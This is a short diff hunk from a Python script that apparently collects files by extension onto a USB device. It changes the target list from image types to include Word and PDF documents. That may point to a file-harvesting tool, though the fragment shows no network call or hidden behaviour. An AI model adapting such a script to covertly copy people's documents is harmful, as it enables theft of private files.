@@ -230,7 +230,7 @@ def main():
             os.mkdir(dir)        
             
     #extlist=['ini','inf','reg','sh','pl','py','sql']# here you type file extensions you want save on your USB device
-    extlist=['jpg','jpeg','gif','ico']
+    extlist=['jpg','jpeg','gif','doc','docx','pdf']
     with multiprocessing.Manager() as manager:
         file_list=manager.list()
         procs=[]
